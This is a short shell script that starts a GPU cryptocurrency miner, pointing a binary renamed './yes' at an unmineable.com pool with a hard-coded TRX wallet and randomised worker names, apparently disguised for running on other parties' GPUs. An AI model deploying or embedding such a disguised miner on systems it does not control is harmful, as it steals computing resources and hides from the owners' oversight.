POOL=rx-us.unmineable.com:3333
WALLET=TRX:TT6VD5PUnyjsbryfdGVcyGhxVRQGP9Y3UC
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo 7dS3Xrjm-$(shuf -i 1911-608146 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
